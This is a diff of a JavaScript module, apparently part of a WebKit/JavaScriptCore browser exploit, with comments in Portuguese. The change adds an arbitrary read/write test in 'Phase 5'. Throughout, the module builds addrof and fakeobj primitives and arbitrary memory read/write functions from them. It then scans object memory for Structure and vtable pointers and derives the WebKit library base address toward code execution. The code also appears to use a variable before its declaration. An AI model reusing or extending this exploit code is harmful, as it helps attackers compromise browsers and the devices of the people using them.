@@ -1,10 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v109 - R69 Scanner de Offsets para Structure/Vtable)
+// js/script3/testArrayBufferVictimCrash.mjs (v110 - R70 Teste de Escrita/Leitura na Fase 5)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Implementação de um scanner de offsets na Fase 5 para tentar identificar o
-//   verdadeiro local do Structure Pointer/ID ou VTable Pointer dentro do JSCell.
-// - Os offsets JSCell.STRUCTURE_POINTER_OFFSET e STRUCTURE_ID_FLATTENED_OFFSET serão testados por varredura.
-// - A leitura direta do StructureID/Pointer será removida/comentada em favor do scanner inicial.
+// - Adiciona um teste de escrita/leitura arbitrária na Fase 5, após a re-inicialização
+//   e o warm-up, para validar a funcionalidade da primitiva neste novo contexto.
+// - Isso ajudará a diagnosticar se o problema é com o fakeobj/arb_read_final_func
+//   no estágio final.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -16,7 +16,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v109_R69_OffsetScanner";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v110_R70_Phase5ReadWriteTest";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -40,7 +40,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Scanner de Offsets para Structure/Vtable ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Teste de L/E na Fase 5 ---`, "test");
 
     let final_result = {
         success: false,
@@ -75,13 +75,27 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
 
         leaker = { obj_prop: null, val_prop: 0 };
-        arb_read_final_func = (addr) => {
+        arb_read_final_func = (addr, size_bytes = 8) => { 
             leaker.obj_prop = fakeobj_func(addr);
-            return doubleToInt64(leaker.val_prop);
+            // IMPORTANTE: Para ler 4 bytes como um int, o JS double-float read/write pode ser complicado.
+            // Para simplicidade de teste, vamos sempre ler 8 bytes. Se for um int32, 
+            // assumimos que os bits mais altos serão zero ou irrelevantes.
+            const result_64 = doubleToInt64(leaker.val_prop);
+            if (size_bytes === 4) {
+                return result_64.low(); // Retorna apenas o low part se 4 bytes forem pedidos
+            }
+            return result_64;
         };
-        arb_write_final_func = (addr, value) => {
+        arb_write_final_func = (addr, value, size_bytes = 8) => { 
             leaker.obj_prop = fakeobj_func(addr);
-            leaker.val_prop = int64ToDouble(value);
+            if (size_bytes === 4) {
+                // Ao escrever 4 bytes, precisamos garantir que o high-part não seja corrompido
+                const current_val_64 = doubleToInt64(leaker.val_prop);
+                const value_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, current_val_64.high());
+                leaker.val_prop = int64ToDouble(value_64);
+            } else {
+                leaker.val_prop = int64ToDouble(value);
+            }
         };
         logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");
 
@@ -95,19 +109,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("Spray de 1000 objetos concluído para estabilização.", "info");
 
         const test_obj_addr = addrof_func(test_obj);
-        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
-        const prop_a_addr = test_obj_addr.add(0x10); 
+        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);
+        const prop_a_addr_phase4 = test_obj_addr.add(0x10); 
 
-        logS3(`(Verificação) Escrevendo ${value_to_write.toString(true)} no endereço ${prop_a_addr.toString(true)}...`, "info");
-        arb_write_final_func(prop_a_addr, value_to_write);
+        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço ${prop_a_addr_phase4.toString(true)}...`, "info");
+        arb_write_final_func(prop_a_addr_phase4, value_to_write_phase4);
 
-        const value_read = arb_read_final_func(prop_a_addr);
-        logS3(`(Verificação) Valor lido de volta: ${value_read.toString(true)}`, "leak");
+        const value_read_phase4 = arb_read_final_func(prop_a_addr_phase4);
+        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");
 
-        if (!value_read.equals(value_to_write)) {
-            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
+        if (!value_read_phase4.equals(value_to_write_phase4)) {
+            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
         }
-        logS3("VERIFICAÇÃO DE L/E COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
+        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
         await PAUSE_S3(50); 
 
         // --- Reiniciar TODO o ambiente para a Fase 5 ---
@@ -140,20 +154,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         
         leaker = { obj_prop: null, val_prop: 0 };
-        arb_read_final_func = (addr, size_bytes = 8) => { // Adicionado size_bytes
+        arb_read_final_func = (addr, size_bytes = 8) => { 
             leaker.obj_prop = fakeobj_func(addr);
+            const result_64 = doubleToInt64(leaker.val_prop);
             if (size_bytes === 4) {
-                return leaker.val_prop & 0xFFFFFFFF; // Assume que o valor lido como double será truncado para 32-bit
+                return result_64.low(); 
             }
-            return doubleToInt64(leaker.val_prop);
+            return result_64;
         };
-        arb_write_final_func = (addr, value, size_bytes = 8) => { // Adicionado size_bytes
+        arb_write_final_func = (addr, value, size_bytes = 8) => { 
             leaker.obj_prop = fakeobj_func(addr);
             if (size_bytes === 4) {
-                // Para 4 bytes, precisamos garantir que apenas os 32 bits mais baixos sejam escritos
-                const current_val = doubleToInt64(leaker.val_prop);
-                const new_low = Number(value) & 0xFFFFFFFF;
-                leaker.val_prop = int64ToDouble(new AdvancedInt64(new_low, current_val.high()));
+                const current_val_64 = doubleToInt64(leaker.val_prop);
+                const value_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, current_val_64.high());
+                leaker.val_prop = int64ToDouble(value_64);
             } else {
                 leaker.val_prop = int64ToDouble(value);
             }
@@ -182,54 +196,63 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await PAUSE_S3(250); 
 
         // ============================================================================
-        // NOVO: SCANNER DE OFFSETS
+        // NOVO: TESTE DE ESCRITA/LEITURA ARBITRÁRIA NA FASE 5
+        // ============================================================================
+        logS3("--- TESTE DE L/E NA FASE 5: Verificando funcionalidade no novo contexto... ---", "subtest");
+        const test_val_phase5 = new AdvancedInt64(0x5555AAAA, 0xBBBBCCCC);
+        // Tenta escrever em uma propriedade conhecida do leak_target_obj (ex: 'f' offset 0x10)
+        const prop_f_addr_phase5 = leak_target_addr.add(0x10); 
+        logS3(`    (Fase 5 L/E Test) Escrevendo ${test_val_phase5.toString(true)} no endereço ${prop_f_addr_phase5.toString(true)} (prop 'f')...`, "info");
+        arb_write_final_func(prop_f_addr_phase5, test_val_phase5);
+
+        const read_back_val_phase5 = arb_read_final_func(prop_f_addr_phase5);
+        logS3(`    (Fase 5 L/E Test) Lido de volta: ${read_back_val_phase5.toString(true)}`, "leak");
+
+        if (!read_back_val_phase5.equals(test_val_phase5)) {
+            throw new Error(`FALHA CRÍTICA: Teste de L/E da Fase 5 falhou. Escrito: ${test_val_phase5.toString(true)}, Lido: ${read_back_val_phase5.toString(true)}. A primitiva de L/E não está funcionando corretamente no novo contexto.`);
+        }
+        logS3("--- TESTE DE L/E NA FASE 5: SUCESSO! A primitiva de L/E está funcional no novo contexto. ---", "good");
+        await PAUSE_S3(50); // Pequena pausa após o teste
+
+        // ============================================================================
+        // SCANNER DE OFFSETS (executa somente se o teste de L/E acima for bem-sucedido)
         // ============================================================================
         logS3("--- SCANNER DE OFFSETS: Varrendo a memória ao redor do objeto alvo... ---", "subtest");
         let found_structure_ptr = null;
         let found_structure_id = null;
         let found_vtable_ptr = null;
 
-        const SCAN_RANGE_START = 0x0; // Começar do início do objeto
-        const SCAN_RANGE_END = 0x100; // Varrer até 0x100 bytes (256 bytes)
-        const SCAN_STEP = 0x8;       // Passos de 8 bytes (QWORD)
+        const SCAN_RANGE_START = 0x0; 
+        const SCAN_RANGE_END = 0x100; 
+        const SCAN_STEP = 0x8;       
 
         for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += SCAN_STEP) {
             const current_scan_addr = leak_target_addr.add(offset);
-            leaker.obj_prop = null; // Limpa antes de cada leitura
+            leaker.obj_prop = null; 
             let val_8_bytes = AdvancedInt64.Zero;
             try {
-                val_8_bytes = arb_read_final_func(current_scan_addr, 8); // Tenta ler 8 bytes
+                val_8_bytes = arb_read_final_func(current_scan_addr, 8); 
                 logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");
 
-                // Tentativa de identificar ponteiro de Structure (apontando para WebKit)
-                // A região do WebKit geralmente começa com 0x7FFF... ou 0x00... em userland.
-                // Um Structure* válido geralmente tem o bit 0 setado em alguns WebKits (tagging).
                 if (!val_8_bytes.equals(AdvancedInt64.Zero) && 
                     (val_8_bytes.high() >>> 16) === 0x7FFF) { 
                     
                     logS3(`    [Scanner] Possível Ponteiro (Structure/Vtable?) em offset ${toHex(offset, 6)}: ${val_8_bytes.toString(true)}`, "leak");
                     
-                    // Se for 0x8 (STRUCTURE_POINTER_OFFSET), é um forte candidato para Structure*
                     if (offset === JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET) {
                         found_structure_ptr = val_8_bytes;
                         logS3(`        [Scanner] --> CANDIDATO FORTE: Ponteiro da Structure em ${toHex(offset, 6)}!`, "good");
                     }
-                    // Se for 0x0 (onde deveria ser o StructureID), mas é um ponteiro, é um problema.
-                    else if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET) {
-                         logS3(`        [Scanner] --> ALERTA: Ponteiro (não ID) encontrado em StructureID offset ${toHex(offset, 6)}.`, "warn");
-                    }
-                    // Pode ser uma vtable pointer, que geralmente está no início da estrutura
-                    else if (offset === 0x0) { // Se o próprio objeto tem uma vtable (ex: C++ base classes)
+                    else if (offset === 0x0) { 
                         found_vtable_ptr = val_8_bytes;
                         logS3(`        [Scanner] --> CANDIDATO: Ponteiro de Vtable (do próprio objeto) em ${toHex(offset, 6)}!`, "good");
                     }
                 }
 
-                // Tentar ler 4 bytes como StructureID (no mesmo offset, ou offsets múltiplos de 4)
-                if (offset % 4 === 0) { // A StructureID pode estar em offsets 0, 4, 8, etc.
+                if (offset % 4 === 0) { 
                     leaker.obj_prop = null; 
-                    const val_4_bytes = arb_read_final_func(current_scan_addr, 4); // Tenta ler 4 bytes
-                    if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { // IDs são pequenos
+                    const val_4_bytes = arb_read_final_func(current_scan_addr, 4); 
+                    if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { 
                         logS3(`    [Scanner] Possível StructureID (Uint32) em offset ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})`, "leak");
                         if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET) {
                              found_structure_id = val_4_bytes;
@@ -255,8 +278,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             actual_structure_id = found_structure_id;
             logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
             
-            // Se encontrou StructureID, tentar vazar a tabela de estruturas.
             const webkit_base_candidate_for_struct_table = jsobject_put_addr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"])); 
+            
             if (webkit_base_candidate_for_struct_table.low() === 0 && webkit_base_candidate_for_struct_table.high() === 0) {
                  throw new Error("Erro interno: webkit_base_candidate_for_struct_table é nulo para cálculo da tabela.");
             }
@@ -274,7 +297,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`[Etapa 2.2] Lendo do endereço ${real_structure_ptr_addr.toString(true)} para obter o ponteiro REAL da Estrutura (ID: ${actual_structure_id})...`, "debug");
             logS3(`[Etapa 2.2] Endereço REAL da Estrutura (Structure) do objeto: ${structure_addr.toString(true)}`, "leak");
 
-            if (structure_addr.equals(value_to_write) || structure_addr.low() === 0 && structure_addr.high() === 0) {
+            if (structure_addr.equals(value_to_write_phase4) || structure_addr.low() === 0 && structure_addr.high() === 0) { // Comparar com o da fase 4
                 throw new Error("FALHA CRÍTICA: Ponteiro REAL da Estrutura (derivado do ID) é NULO/Inválido ou contaminação persistente.");
             }
             if (!((structure_addr.high() >>> 16) === 0x7FFF || (structure_addr.high() === 0 && structure_addr.low() !== 0))) { 
@@ -282,13 +305,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
 
         } else {
-            // Se o scanner não encontrou nada promissor
             throw new Error(`FALHA CRÍTICA: Scanner de offsets não encontrou Structure Pointer ou StructureID válidos no objeto alvo. Ultimo vazado leak_target_addr: ${leak_target_addr.toString(true)}`);
         }
 
 
         // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
-        // 3. Ler o ponteiro da função virtual 'put' de dentro da Estrutura.
         const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
         leaker.obj_prop = null; 
         const jsobject_put_addr = arb_read_final_func(vfunc_put_ptr_addr); 
